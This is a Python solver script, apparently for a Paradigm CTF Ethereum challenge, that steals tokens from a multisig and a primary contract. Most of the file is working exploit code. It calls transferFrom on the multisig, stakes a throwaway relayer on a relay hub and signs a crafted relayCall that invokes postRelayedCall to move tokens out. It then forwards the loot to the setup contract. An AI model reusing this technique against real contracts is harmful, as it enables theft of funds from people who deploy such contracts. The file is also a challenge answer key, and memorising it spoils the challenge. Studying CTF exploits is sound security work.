from paradigmctf.eth_challenge import *

from web3 import Web3
from eth_account import Account
from eth_abi import encode
from eth_abi.packed import encode_packed

def pack(frm, recipient, encodedFunction, transactionFee, gasPrice, gasLimit, nonce, relayerHub, relayer):
    packed = encode_packed(
        ['address', 'address', 'bytes', 'uint256', 'uint256', 'uint256', 'uint256', 'address'],
        [frm, recipient, encodedFunction, transactionFee, gasPrice, gasLimit, nonce, relayerHub]
    )
    packed = encode_packed(['string', 'bytes'], ['rlx:', packed])
    packed = encode_packed(['bytes', 'address'], [packed, relayer])
    return packed


RELAY_HUB_ADDRESS = "0xD216153c06E857cD7f72665E0aF1d7D82172F494"
DREAMERS_TOKEN_ADDRESS = "0x1C4d5CA50419f94fc952a20DdDCDC4182Ef77cdF"
PRIMARY_ADDRESS = "0x16154F7e9DE01e6B39dAc3159805e9B1531ee3cf"
MULTISIG_ADDRESS = "0xb21090C8f6bAC1ba614A3F529aAe728eA92B6487"
MULTISIG_STEAL_AMOUNT = 10 * 10 ** 18
PRIMARY_STEAL_AMOUNT = 17 * 10 ** 18

def solve(web3: Web3, player: Account, setup: str):

    relayerAccount = Account.create()

    ################ Step 1: transfer tokens from multisig to primary ################

    sign_send_tx(web3, player, {
        "to": DREAMERS_TOKEN_ADDRESS,
        "gas": 12_500_000,
        "gasPrice": 0,
        "nonce": 0,
        "data": encode_function_call(web3, "transferFrom", ["address", "address", "uint256"], [MULTISIG_ADDRESS, PRIMARY_ADDRESS, MULTISIG_STEAL_AMOUNT])
    })

    ################ Step 2: stake some eth for the relayer ################

    sign_send_tx(web3, player, {
        "to": RELAY_HUB_ADDRESS,
        "gas": 12_500_000,
        "gasPrice": 0,
        "nonce": 1,
        "value": web3.toWei(1, "ether"),
        "data": encode_function_call(web3, "stake", ["address", "uint256"], [relayerAccount.address, 604800]) # 1 week
    })

    ################ Step 3: relayer signs data, registers, and relays call ################

    send_tx(web3, {
        "gas": 12_500_000,
        "from": player.address,
        "to": relayerAccount.address,
        "value": web3.toWei(5, "ether"),
    })

    frm = relayerAccount.address
    recipient = PRIMARY_ADDRESS
    gasLimit = 3000000
    funcData = encode(['address', 'uint256', 'uint256', 'uint256'],[relayerAccount.address, PRIMARY_STEAL_AMOUNT, 0, 0])
    encodedFunction = web3.sha3(text="postRelayedCall(bytes,bool,uint256,bytes32)")[:4]
    encodedFunction += encode(['bytes', 'bool', 'uint256', 'bytes32'],[funcData, True, 0, b''])
    packed = pack(frm, recipient, encodedFunction, 0, 0, gasLimit, 0, RELAY_HUB_ADDRESS, relayerAccount.address)
    toSign = Web3.soliditySha3(['bytes'], [packed])
    toSign = encode_packed(['string', 'bytes32'], ['\x19Ethereum Signed Message:\n32', toSign])
    toSign = Web3.soliditySha3(['bytes32'], [toSign])
    signature = Account.signHash(toSign, relayerAccount.key).signature

    sign_send_tx(web3, relayerAccount, {
        "to": RELAY_HUB_ADDRESS,
        "gas": 12_500_000,
        "gasPrice": 0,
        "nonce": 0,
        "data": encode_function_call(web3, "registerRelay", ["uint256", "string"], [0, ""])
    })

    sign_send_tx(web3, relayerAccount, {
        "to": RELAY_HUB_ADDRESS,
        "gas": 12_500_000,
        "gasPrice": 0,
        "nonce": 1,
        "data": encode_function_call(web3, "relayCall", 
            ["address", "address", "bytes", "uint256", "uint256", "uint256", "uint256", "bytes", "bytes"], 
            [frm, recipient, encodedFunction, 0, 0, gasLimit, 0, signature, b'']
        )
    })

    ################ Step 4: Now the relayer has the tokens, send them to the setup to win ################

    sign_send_tx(web3, relayerAccount, {
        "to": DREAMERS_TOKEN_ADDRESS,
        "gas": 12_500_000,
        "gasPrice": 0,
        "nonce": 2,
        "data": encode_function_call(web3, "transfer", ["address", "uint256"], [setup, PRIMARY_STEAL_AMOUNT])
    })


    
run_solver(solve)